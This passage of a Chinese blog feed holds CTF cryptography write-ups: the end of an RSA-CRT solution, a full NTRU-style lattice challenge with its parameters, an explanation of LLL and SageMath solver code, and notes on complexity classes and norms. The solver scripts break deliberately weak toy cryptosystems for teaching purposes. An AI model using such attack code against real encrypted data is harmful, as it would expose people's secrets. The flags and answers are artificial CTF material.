class="built_in">pow</span>(c,d,N))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))  <span class="comment"># flag&#123;s0rry_4_the_si11y_mis7ak3!!!&#125;</span></span><br></pre></td></tr></table></figure><p><strong>疑惑</strong><br>试着求一下dp、dq的上限</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2 <span class="keyword">as</span> gp</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">N, e = (<span class="number">5943169364392579648240628105465400265561630477719849140342288893646282358845864829196464904298425034495515703590715696166689341849788423790118035115884268058450057766891418761627136386260375534474238287294722575087291704432681906513559934960801746158191355141430407698622886747610818853554584519369492697299961587570531415598410602926850787615266600194130088653542080297272898142822126215764285317511778718862825024939241749996811603610592132845393755564618871967716819173935553139267269362451423802419847919801412517294612793840767037662589233422389282092051866024514599213445596030685325227269609799</span>, <span class="number">1762727270442607836236621349004505613506359415168929966540357011133047321101203605340201016757203407375680206339341465088639129039278027484128644822299382121442456525803635369125157261704416172232695058332167310707999473221769390010733123910955508477009411113166141188309425895082608534271594076218827</span>)</span><br><span class="line">dpl, dql = (<span class="number">1361</span>, <span class="number">1475</span>)</span><br><span class="line">tmp = [<span class="built_in">int</span>((<span class="number">1</span>/<span class="number">4</span>)*(N//e)**(<span class="number">2</span>/<span class="number">5</span>)), <span class="built_in">int</span>((<span class="number">1</span>/<span class="number">3</span>)*N**(<span class="number">1</span>/<span class="number">4</span>))]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">int</span>(log(<span class="built_in">min</span>(tmp), <span class="number">2</span>)))</span><br><span class="line"><span class="comment"># 397</span></span><br></pre></td></tr></table></figure><p>06年paper居然能到$2^{397}$? 那07年的[这篇](<a href="https://www.iacr.org/archive/crypto2007/46220388/46220388.pdf">The New Attack on RSA-CRT</a>)才到$2^{146}$ ($N^{0.073}$)?</p><h4 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h4><ul><li><p>bound计算</p></li><li><p>平衡向量的思路以及对角矩阵</p><p><code>diagonal_matrix()</code></p></li><li><p>矩阵构造时考虑bound的意识，维度高了SVP结果就变了（也疑惑非方阵如何求行列式？）</p><p>$\begin{bmatrix} e^2&amp;1&amp;0&amp;0&amp;0 \\ e&amp;0&amp;1&amp;0&amp;0 \\<br>1-N&amp;0&amp;0&amp;1&amp;0 \\ 1&amp;0&amp;0&amp;0&amp;1\end{bmatrix}$</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初探格密码</title>
      <link href="/2023/02/09/%E5%88%9D%E6%8E%A2%E6%A0%BC%E5%AF%86%E7%A0%81/"/>
      <url>/2023/02/09/%E5%88%9D%E6%8E%A2%E6%A0%BC%E5%AF%86%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="初探格密码·NTRU"><a href="#初探格密码·NTRU" class="headerlink" title="初探格密码·NTRU"></a>初探格密码·NTRU</h1><p>笔者最早接触格密码是在先知社区Soreat_u师傅的发文中，其中便给出了如下的题目，学习后有了很大的收获。</p><p>而随着先知社区关闭、文章被删等原因，我找到了<a href="https://blog.soreatu.com/posts/an-introduction-to-ntruencrypt-through-a-ctf-challenge/">Soreat_u师傅博客原文</a>, 但又因其图片失效问题影响阅读、分享，便有了此文。</p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>来源于2020年巅峰极客（数据为笔者生成的），赛时仅有2解。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate</span>():</span></span><br><span class="line">    p = getStrongPrime(<span class="number">2048</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = getRandomNBitInteger(<span class="number">1024</span>)</span><br><span class="line">        g = getStrongPrime(<span class="number">768</span>)</span><br><span class="line">        h = gmpy2.invert(f, p) * g % p</span><br><span class="line">        <span class="keyword">return</span> (p, f, g, h)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">plaintext, p, h</span>):</span></span><br><span class="line">    m = bytes_to_long(plaintext)</span><br><span class="line">    r = getRandomNBitInteger(<span class="number">1024</span>)</span><br><span class="line">    c = (r * h + m) % p</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p, f, g, h = generate()</span><br><span class="line">c = encrypt(flag, p, h)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;h =&#x27;</span>, h)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;p =&#x27;</span>, p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c =&#x27;</span>, c)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">h = 15920807412952692847985174177588211960281948838307253586797239960508125481987882224605864406372742338485793530131031795389776531751200676051949170672004649326503467447518123006808297262753280286176914568491022298784897984879823370933511805201516939304165656461649805404345353075803763209810253831770288511818668398003443730898078080711296567200650962390927974385735100849320021423318726773493255693093044142610555698370275203822724528162516863483780170076614868308468049805668954554578089167666866242081591436319781031943877834260419842837279937368942586813623585114579680192182136454951076576180846308031147577895183</span></span><br><span class="line"><span class="string">p = 29616445112694260274774681537287299269831042656521626513009034520717072986110554689452007791622053679125813101887358792411152206641110832730768759894034995329749945245036475665938165090997263055454214551943883405059392525425764609291470545536168035201657530029849113821500078015786845062143152799634844986753056256220285729693791666273618731684193516606613125066125143895019716948226556471128531174411802630235945882713680099627033330758906060609807833477234842026397619463093836747345939002210487194276855948870859245196439206070300222410002340377429280616491741559912351526804469748340235688215655559714767093336011</span></span><br><span class="line"><span class="string">c = 24894154600738747801028572977171957374256712941786243361235711912410748252475712552938200529578615522555383736598357845901370674754857388874985225645650913059820754690696257510209172235875364336887131653254443697948965333434213242584604843844646774324930722413839123594241879178636469903372909302377061318833174246232722769872293078758804927418352848560803152544304608965368181815249876729133751310904899772060616419975025741262545479052454752165874425435226386604586446369944613258629120527951194286510228752204113015018002437399369034486123978271982779314575972603420464431960235222295086660836240988842127196837233</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><h3 id="根据大小关系化简"><a href="#根据大小关系化简" class="headerlink" title="根据大小关系化简"></a>根据大小关系化简</h3><p>关注题目参数大小</p><ul><li><p>$p: 2048 \space bit$</p></li><li><p>$f: 1024 \space bit$</p></li><li><p>$g: 768 \space bit$</p></li><li><p>$h = f^{-1}*g \mod p :2048 \space bit$</p></li><li><p>$r: 1024 \space bit$</p></li><li><p>$c = (r \cdot h + m)= (r \cdot f^{-1}*g + m) \mod p :2048 \space bit$</p></li></ul><p>于是有：<br>$$<br>c \cdot f = r \cdot g + m \cdot f \mod p<br>$$<br>让我们关注等式右侧，不难发现: $r \cdot g +m \cdot f$的大小肯定不会超过$p$（2048bit）</p><p>即，这<strong>不是同余式而是等式</strong>（记$c \cdot f \space \% \space p$的结果为$c’$）：<br>$$<br>c’= r \cdot g + m \cdot f<br>$$<br>若我们<strong>有了参数$f、g$，</strong>那么这题便可以<strong>绕过r求解m</strong>了，流程如下：</p><ol><li><p>等式两边同时对g取余</p><p>$c’= m \cdot f \mod g$</p></li><li><p>等式两边同时乘f对g的逆</p><p>$c’ \cdot f^{-1}= m \mod g$</p></li></ol><p>一般来说flag不会太大，模g有768bit比m大，如上运算便可以得到m的真值。</p><p><strong>那么我们该如何求解f、g呢？</strong></p><p>答案很显然了，<strong>格</strong>。</p><h3 id="利用格求出未知量"><a href="#利用格求出未知量" class="headerlink" title="利用格求出未知量"></a>利用格求出未知量</h3><p>与$f、g$同时有关系的只有如下这个式子：<br>$$<br>\begin{aligned}h &amp;= f^{-1}*g \mod p \\ h \cdot f &amp;= g + kp \end{aligned}<br>$$<br>“一个式子居然能求两个未知数吗？”，你想到。</p><p>「<strong>事实上，只要等式中参数大小足够巧妙，我们便能利用格来求解其中未知量</strong>」</p><p>先给出结论，对于如下矩阵M，对其使用LLL算法后，我们可以得到$f, g$<br>$$<br>M = \begin{bmatrix} 1 &amp; h \\ 0 &amp; p \end{bmatrix}<br>$$<br><strong>那么，我们是如何写出这个矩阵的呢？</strong></p><p>事实上，写出矩阵M的过程都是以这一句话为<strong>准则</strong>的，即：$v \cdot M = \vec w$</p><ul><li>$v$：未知量矩阵</li><li>$M$：已知量矩阵</li><li>$\vec w$：要求量矩阵</li></ul><p>对于本题，最容易确认的是$\vec w$, 因为我们需要求的量很明确，就是$f, g$。</p><p>所以，有：<br>$$<br>\vec w = [f \space\space\space g]<br>$$<br>其次，格是通过等式来建立的，我们看向本题的关系式：<br>$$<br>h \cdot f -kp= g<br>$$<br>其中，$f、k、g$为<strong>未知量</strong>，$f、g$为<strong>要求量</strong></p><p>确定$v$，如下（一般来说，等式里<strong>能单独表示的要求量不放在未知量矩阵里</strong>，如本题中$g$）：<br>$$<br>v = [f \space\space\space -k ]<br>$$<br>最后，根据矩阵乘法确定$M$，如下：<br>$$<br>M = \begin{bmatrix} 1 &amp; h \\ 0 &amp; p \end{bmatrix}<br>$$<br>总的看来，我们写出如下$v \cdot M = \vec w$<br>$$<br>\begin{bmatrix} f &amp; -k \end{bmatrix}  \begin{bmatrix} 1 &amp; h \\ 0 &amp; p \end{bmatrix} =<br>\begin{bmatrix} f &amp; g \end{bmatrix}<br>$$<br>值得一说，在<strong>确认已知量矩阵$M$</strong>时，依赖的等式有：</p><ul><li>$f \cdot 1 - k \cdot 0 =f$</li></ul><ul><li>$f \cdot h -kp= g$</li></ul><p>好的，知道$M$如何来的以后，又有一个问题产生了</p><p><strong>为什么对$M$使用LLL算法能得到$f、g$?</strong></p><h3 id="格的定义以及原理"><a href="#格的定义以及原理" class="headerlink" title="格的定义以及原理"></a>格的定义以及原理</h3><p>我们只需要弄懂以下格相关知识，便可进行接下来的题目讲解。</p><ol><li>什么是格？</li><li>SVP的上限是？</li><li>LLL可以在一定程度内求解SVP</li></ol><h4 id="格是什么"><a href="#格是什么" class="headerlink" title="格是什么"></a>格是什么</h4><blockquote><p>线性无关基向量$v_1, v_2, v_3, .. ., v_n$的所有整系数线性组合所形成的$n$维离散空间。</p></blockquote><p>给定n维空间中一组<strong>线性无关</strong>向量，其<strong>整系数</strong>组合构成的集合称为格。</p><p>格上的点排布呈周期性规律。</p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20221115221257017.png" alt="2-dimension Lattice"></p><p>这里需要明确，<strong>不同的格基可能表示的是同一个格</strong>, 如下:</p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20221130231915760.png" alt="image-20221130231915760"></p><h4 id="SVP｜shortest-vector-problem"><a href="#SVP｜shortest-vector-problem" class="headerlink" title="SVP｜shortest vector problem"></a>SVP｜shortest vector problem</h4><p><strong>最短向量问题</strong>：给定一个基为$B$的Lattice $L(B)$，找到一个这个基构成的格点，使得这个点距离0坐标点的距离最近.</p><h5 id="SVP的上限"><a href="#SVP的上限" class="headerlink" title="SVP的上限"></a>SVP的上限</h5><p>根据Hermit定理（MINKOWSKI第一定理），有：</p><p>$$<br>\lambda_1(Λ) \leq \sqrt{n} * \sqrt[n]{det(Λ)}<br>$$</p><p>其中，参数意义如下：</p><ul><li><p>$Λ$：格基矩阵</p></li><li><p>$\lambda_1(Λ)$： 格中最短向量的长度</p></li><li><p>$n$：格的维度</p></li><li><p>$det()$: 行列式</p></li></ul><h4 id="LLL"><a href="#LLL" class="headerlink" title="LLL"></a>LLL</h4><p>LLL 算法就是在格上找到一组基，满足如下效果</p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20230209221112075.png" alt="image-20230209221112075"></p><p>可以简单的理解为：给定任意格基，LLL算法能规约出<strong>格中短的、正交性好的格基</strong></p><p>如果得当，我们所寻找的最短向量就在其中。</p><p>值得一说，LLL后得到的格基矩阵中有多组基向量，越往下长度越长</p><h4 id="题目讲解"><a href="#题目讲解" class="headerlink" title="题目讲解"></a>题目讲解</h4><p>回到题目，一言以蔽之，我们所写的$v \cdot M = \vec w$，如下：<br>$$<br>\begin{bmatrix} f &amp; -k \end{bmatrix}  \begin{bmatrix} 1 &amp; h \\ 0 &amp; p \end{bmatrix} =<br>\begin{bmatrix} f &amp; g \end{bmatrix}<br>$$<br>运算本质是：<strong>对基向量$(1,h)、(0, p)$进行了线形组合，得到了$(f, g)$</strong></p><p>而这，证明了这样一件事：<strong>点$(f, g)$在$M$所张成的格上。</strong></p><p>相对于两个基向量$(1, h), (0, p)$来说，向量$(f, g)$的长度要小得多得多。</p><p>根据<strong>Hermit定理</strong>可知，在这个格中最短向量的长度大概在<code>sqrt(2^2048)=2^1024</code>左右。因此，很大概率上，<strong>$(f, g)$就是这个lattice的最短向量</strong>。</p><p>所以，我们可以对$M$使用LLL获得$(f, g)$。</p><hr><p>到此，题目原理讲解便结束了。</p><p>但作为密码手，仅知悉这些知识还是远远不够的，应当更广泛的去了解、学习格的相关定义与构造法则。</p><p>这里给出两篇拓展阅读，望能对读者的CTF格基密码学习之路提供帮助。</p><ul><li><a href="https://harry0597.com/2022/12/30/格密码学习/">格密码学习</a></li><li><a href="https://harry0597.com/2022/12/30/格密码应用/">格密码应用</a></li></ul><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>无论是矩阵的建立，还是LLL算法，SageMath都内置，很方便。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">h = <span class="number">15920807412952692847985174177588211960281948838307253586797239960508125481987882224605864406372742338485793530131031795389776531751200676051949170672004649326503467447518123006808297262753280286176914568491022298784897984879823370933511805201516939304165656461649805404345353075803763209810253831770288511818668398003443730898078080711296567200650962390927974385735100849320021423318726773493255693093044142610555698370275203822724528162516863483780170076614868308468049805668954554578089167666866242081591436319781031943877834260419842837279937368942586813623585114579680192182136454951076576180846308031147577895183</span></span><br><span class="line">p = <span class="number">29616445112694260274774681537287299269831042656521626513009034520717072986110554689452007791622053679125813101887358792411152206641110832730768759894034995329749945245036475665938165090997263055454214551943883405059392525425764609291470545536168035201657530029849113821500078015786845062143152799634844986753056256220285729693791666273618731684193516606613125066125143895019716948226556471128531174411802630235945882713680099627033330758906060609807833477234842026397619463093836747345939002210487194276855948870859245196439206070300222410002340377429280616491741559912351526804469748340235688215655559714767093336011</span></span><br><span class="line">c = <span class="number">24894154600738747801028572977171957374256712941786243361235711912410748252475712552938200529578615522555383736598357845901370674754857388874985225645650913059820754690696257510209172235875364336887131653254443697948965333434213242584604843844646774324930722413839123594241879178636469903372909302377061318833174246232722769872293078758804927418352848560803152544304608965368181815249876729133751310904899772060616419975025741262545479052454752165874425435226386604586446369944613258629120527951194286510228752204113015018002437399369034486123978271982779314575972603420464431960235222295086660836240988842127196837233</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 求解f, g</span></span><br><span class="line">Ge = matrix(ZZ, [[<span class="number">1</span>, h], [<span class="number">0</span>, p]])</span><br><span class="line">f, g = Ge.LLL()[<span class="number">0</span>]  <span class="comment"># SVP</span></span><br><span class="line"><span class="comment"># 利用f, g求解m</span></span><br><span class="line">f = <span class="built_in">abs</span>(f)</span><br><span class="line">g = <span class="built_in">abs</span>(g)</span><br><span class="line">c_ = (c*f)%p</span><br><span class="line">m = c_*inverse_mod(f, g)%g</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>概念札记</title>
      <link href="/2022/12/30/%E6%A6%82%E5%BF%B5%E6%9C%AD%E8%AE%B0/"/>
      <url>/2022/12/30/%E6%A6%82%E5%BF%B5%E6%9C%AD%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="时间复杂度与问题分类-P、NP、NPC、NP-hard"><a href="#时间复杂度与问题分类-P、NP、NPC、NP-hard" class="headerlink" title="时间复杂度与问题分类(P、NP、NPC、NP-hard)"></a>时间复杂度与问题分类(P、NP、NPC、NP-hard)</h2><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://blog.csdn.net/sinat_41348401/article/details/122347609">https://blog.csdn.net/sinat_41348401/article/details/122347609</a></li><li><a href="https://blog.csdn.net/qq_38250032/article/details/81586329">https://blog.csdn.net/qq_38250032/article/details/81586329</a></li></ul><h3 id="时间复杂度（Time-complexity）"><a href="#时间复杂度（Time-complexity）" class="headerlink" title="时间复杂度（Time complexity）"></a>时间复杂度（Time complexity）</h3><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><p><strong>时间复杂度</strong>：指的是随着问题规模的扩大，解决所需的时间的增长速度，能用来评估执行程序所需的时间。 </p><p>换言之，即为求解算法的运算量。</p><h4 id="多项式时间（Polynomial-time）"><a href="#多项式时间（Polynomial-time）" class="headerlink" title="多项式时间（Polynomial time）"></a>多项式时间（Polynomial time）</h4><p>什么是多项式时间？回答这个问题得先知道计算中<strong>常用的时间复杂度排序</strong>。</p><p>在时间复杂度的计算中常用的时间复杂度按照耗费的时间从小到大依次是：$O(1)&lt;O(logn)&lt;O(n)&lt;O(nlogn)&lt;O(n²)&lt;O(n³)&lt;O(2ⁿ)&lt;O(n!)$.</p><p>而<strong>多项式时间</strong>则包含以上n作为底数的时间复杂度所花时间, 即：$O(1)$到$O(n^{m})$所花时间.</p><p>再后面的$O(2ⁿ)、O(n!)$则是指数级问题，也就是我们经常说的爆炸性增长，属于<strong>非多项式级复杂度</strong>。</p><p>区分出<strong>多项式时间复杂度</strong>与$O(2ⁿ)，O(n!)$型<strong>非多项式级复杂度</strong>的根本标准是：问题规模较大时，计算机很难算出后者结果。</p><p>所以我们需要<strong>多项式级复杂度的算法。</strong></p><h3 id="问题分类"><a href="#问题分类" class="headerlink" title="问题分类"></a>问题分类</h3><h4 id="P-Polynomial"><a href="#P-Polynomial" class="headerlink" title="P(Polynomial)"></a>P(Polynomial)</h4><p>Polynomial adj.多项式的</p><p>我们称一类问题是<strong>P</strong>，则指在<strong>多项式时间可以“解决</strong>”的一类问题。</p><p>也就是好解决，而且我们解决的还不错，又快又准。</p><h4 id="NP（Non-deterministic-Polynomial）"><a href="#NP（Non-deterministic-Polynomial）" class="headerlink" title="NP（Non-deterministic Polynomial）"></a><strong>NP</strong>（Non-deterministic Polynomial）</h4><p>Non-deterministic Polynomial 非确定性多项式的</p><p>我们称一类问题是<strong>NP</strong>，则意味着我们能在<strong>多项式时间“验证”某个解是否正确</strong>。</p><p>而与P相比，P类问题（可以解决）必然是NP（可以验证）</p><p>但反过来，NP问题是否一定是P问题，则尚未有人证明，是不确定的</p><p>（因为若你觉得某NP问题是只能验证不能求解的，别人则可以合理怀疑只是我们还没发现解决的算法）</p><h4 id="归约（Polynomial-time-Reducibility）"><a href="#归约（Polynomial-time-Reducibility）" class="headerlink" title="归约（Polynomial-time Reducibility）"></a>归约（Polynomial-time Reducibility）</h4><blockquote><p>如果能找到这样一个变化法则，对任意一个程序A的输入，都能按这个法则变换成程序B的输入，使两程序的输出相同，那么我们说，问题A可归约为问题B。</p></blockquote><p>在交代什么是NPC之前，得先清楚什么是归约。</p><p>简单地说，<strong>问题A可以归约为问题B</strong>的意思是说：可用问题B的解法解决问题A，或者说，问题A可以“变成”问题B.</p><p>例如求解一个<strong>一元一次</strong>方程和求解一个<strong>一元二次</strong>方程，我们说，前者可以归约为后者。</p><p>是因为知道怎样解一个一元二次方程，那么一定能解出一元一次方程</p><p>（因为一元一次方程是一个二次项系数为零的特殊的一元二次方程）</p><p>从上面这个例子，我们其实就可以发现：从特殊的小众的问题归约到大问题后，解决的方法<strong>变复杂</strong>了，时间复杂度增加，但<strong>普适性更强</strong>，可以在适用在更多范围。</p><p>而且<strong>归约有一项重要的性质：传递性</strong>，A-&gt;B-&gt;C, 则：A-&gt;C</p><p>若我们能将一个NP问题不断归约，它就会被归约成一个时间复杂度最高且能「通吃」所有其他NP问题的超级问题，我们管它叫<strong>NPC问题。</strong></p><h4 id="NPC（NP-complete，NP完备）"><a href="#NPC（NP-complete，NP完备）" class="headerlink" title="NPC（NP complete，NP完备）"></a>NPC（NP complete，NP完备）</h4><p>判断是否为NP完备，有两个依据：</p><ol><li>这个问题得是NP</li><li>必须所有NP都可以规约到它</li></ol><p>换言之，正如前文所讨论的NP归约，若存在这样一个NP问题，所有的NP问题都可以归约成它，并且这种问题不只一个，它有很多个，是一类问题，就叫为 NP完备 或 NP完全问题。</p><h4 id="NP-hard（NP困难）"><a href="#NP-hard（NP困难）" class="headerlink" title="NP-hard（NP困难）"></a>NP-hard（NP困难）</h4><p>判断是否为NP困难，同样也是两个依据：</p><ol><li>必须所有NP都可以规约到它</li><li>但是它本身并<strong>不一定是NP</strong></li></ol><p>因为不需要是NP问题，NP-Hard问题要比 NPC问题的范围广。</p><p>若有一天，我们找到了NPC问题的多项式时间算法，那么能被归约为这类NPC问题的NP问题都将得到解决。</p><p>但是，NP-hard问题仍然无法用多项式算法解决，因为它不是NP问题，连答案的验证都很困难。</p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LqR5rmW5Zyo5oiQ6ZW_,size_20,color_FFFFFF,t_70,g_se,x_16.png" alt="关系图"></p><p>🚬</p><p><strong>注解：</strong>P一定是NP，NP不一定是P（当P!=NP时，见左图；当P=NP时，见右图）。一部分NP可以规约为NPC，一部分NP是NP-hard。NPC和NP-hard有交集。交集的部分就是NP。</p><blockquote><p>？？？不应该是NP和NP-hard有交集。交集的部分就是NPC。</p></blockquote><h2 id="范数（norm）"><a href="#范数（norm）" class="headerlink" title="范数（norm）"></a>范数（norm）</h2><h3 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://en.wikipedia.org/wiki/Norm_(mathematics)">https://en.wikipedia.org/wiki/Norm_(mathematics)</a></li><li><a href="https://blog.csdn.net/weixin_38937984/article/details/102975811">https://blog.csdn.net/weixin_38937984/article/details/102975811</a></li><li><a href="https://blog.csdn.net/kingzone_2008/article/details/15073987">https://blog.csdn.net/kingzone_2008/article/details/15073987</a></li><li>计算方法</li></ul><h3 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h3><p><strong>范数</strong>，是具有“<strong>长度</strong>”概念的函数。</p><p>相关的数学领域，范数是能<strong>衡量向量或矩阵的长度</strong>的函数。</p><p>而衡量的方法很多，对应的「范数」也就不同。</p><p>那什么函数能被称为范数，或者说，范数的条件是什么？</p><p>一个函数是范数的充要条件：</p><p>函数$||x||$</p><ul><li><p>满足<strong>非负性</strong>$||x|| &gt;= 0$</p></li><li><p>满足<strong>齐次性</strong>$||cx|| = |c| •||x|| $</p><p>c是常数</p></li><li><p>满足<strong>三角不等式</strong>$||x+y|| &lt;= ||x|| + ||y||$</p><p>类比三角形任意两边之和大于第三边</p></li></ul><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><h4 id="向量的范数"><a href="#向量的范数" class="headerlink" title="向量的范数"></a>向量的范数</h4><h5 id="L1范数"><a href="#L1范数" class="headerlink" title="L1范数"></a>L1范数</h5><p>L1范数是指向量中各个<strong>元素绝对值之和</strong>。<br>$$<br>||x||_1 = \sum^{n} _ {i=1} |x_i|<br>$$</p><h5 id="L2范数-欧几里得Euclidean范数或Frobenius范数"><a href="#L2范数-欧几里得Euclidean范数或Frobenius范数" class="headerlink" title="L2范数(欧几里得Euclidean范数或Frobenius范数)"></a>L2范数(欧几里得Euclidean范数或Frobenius范数)</h5><p>欧几里得范数（L2范数）为向量各个<strong>元素平方和的$\frac{1}{2}$次方</strong>。</p><p>$$<br>||x|| = ||x||_2 = \sqrt{\sum\limits^{n} _ {i=1} {x_i}^2}<br>$$<br>值得一提，<strong>欧几里得范数（Euclidean norm） 也叫 欧式长度(距离) 、 L2 范数 、 L2距离</strong></p><h5 id="LP范数"><a href="#LP范数" class="headerlink" title="LP范数"></a>LP范数</h5><p>通过以上，相信你已经看出规律了，即：</p><p>Lp范数为向量各个<strong>元素绝对值p次方和的$\frac{1}{p}$次方</strong>。<br>$$<br>||x||_p = \sqrt[p]{\sum\limits^{n} _ {i=1} {x_i}^p}<br>$$</p><h5 id="L∞范数"><a href="#L∞范数" class="headerlink" title="L∞范数"></a>L∞范数</h5><p>特殊的，我们定义L∞范数为向量各个<strong>元素绝对值最大那个元素的绝对值</strong><br>$$<br>||x|| _ ∞ = \mathop{max}\limits _ {1≤i≤n}|x _ i|<br>$$</p><h4 id="矩阵的范数"><a href="#矩阵的范数" class="headerlink" title="矩阵的范数"></a>矩阵的范数</h4><p>设$x \in R^n, A \in R^{n×n}$</p><h5 id="矩阵的列范数"><a href="#矩阵的列范数" class="headerlink" title="矩阵的列范数"></a>矩阵的列范数</h5><p>$||x|| _ 1 = \sum\limits^n _ {i=1}{|x_i|}$  对应   $||A|| _ 1 = \mathop{max}\limits _ {1≤j≤n}\sum\limits^n _ {i=1}{|a_{ij}|}$</p><p>矩阵的列范数$||A||_1$即每列元素绝对值之和最大值。</p><h5 id="矩阵的行范数"><a href="#矩阵的行范数" class="headerlink" title="矩阵的行范数"></a>矩阵的行范数</h5><p>$||x|| _ ∞ = \mathop{max}\limits _ {1≤i≤n}|x _ i|$  对应  $||A|| _ ∞ = \mathop{max}\limits _ {1≤i≤n}\sum\limits^{n} _ {j=1}|a _ {ij}|$</p><p>矩阵的行范数$||A||_∞$即每行元素绝对值之和最大值。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>格密码应用</title>
      <link href="/2022/12/30/%E6%A0%BC%E5%AF%86%E7%A0%81%E5%BA%94%E7%94%A8/"/>
      <url>/2022/12/30/%E6%A0%BC%E5%AF%86%E7%A0%81%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="格密码应用"><a href="#格密码应用" class="headerlink" title="格密码应用"></a>格密码应用</h1><h2 id="NPUCTF2020-BABYLCG"><a href="#NPUCTF2020-BABYLCG" class="headerlink" title="NPUCTF2020[BABYLCG]"></a>NPUCTF2020[BABYLCG]</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span 